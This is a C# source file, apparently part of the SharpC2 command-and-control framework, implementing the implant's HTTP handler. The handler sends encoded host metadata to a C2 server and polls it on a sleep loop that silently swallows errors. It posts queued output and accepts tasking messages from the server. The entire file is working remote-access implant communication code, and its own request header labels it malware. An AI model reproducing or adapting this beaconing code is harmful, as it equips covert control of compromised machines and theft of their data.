using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Handlers
{
    public class DefaultHttpHandler : Handler
    {
        public override string Name { get; } = "default-http";

        private HttpClient _client;
        private bool _running;

        public override void Init(DroneConfig config, Metadata metadata)
        {
            base.Init(config, metadata);

            _client = new HttpClient {BaseAddress = new Uri($"{HttpScheme}://{ConnectAddress}:{ConnectPort}")};
            _client.DefaultRequestHeaders.Clear();

            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
            _client.DefaultRequestHeaders.Add("X-Malware", "SharpC2");
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _running = true;

            while (_running)
            {
                try { await CheckIn(); }
                catch { /* pokemon */ }

                var interval = Config.GetConfig<int>("SleepInterval");
                await Task.Delay(interval * 1000);
            }
        }

        private async Task CheckIn()
        {
            if (OutboundQueue.IsEmpty) await SendGet();
            else await SendPost();
        }

        private async Task SendGet()
        {
            var response = await _client.GetAsync("/");
            await HandleResponse(response);
        }

        private async Task SendPost()
        {
            var data = GetOutboundQueue().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(data), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/", content);
            await HandleResponse(response);
        }

        private async Task HandleResponse(HttpResponseMessage response)
        {
            if (!response.IsSuccessStatusCode) return;

            var data = await response.Content.ReadAsByteArrayAsync();
            if (data.Length == 0) return;

            var envelope = data.Deserialize<C2Message>();
            if (envelope is null) return;

            InboundQueue.Enqueue(envelope);
        }

        public override void Stop()
        {
            _running = false;
        }

        private static string HttpScheme => "http";
        private static string ConnectAddress => "localhost";
        private static string ConnectPort => "80";
    }
}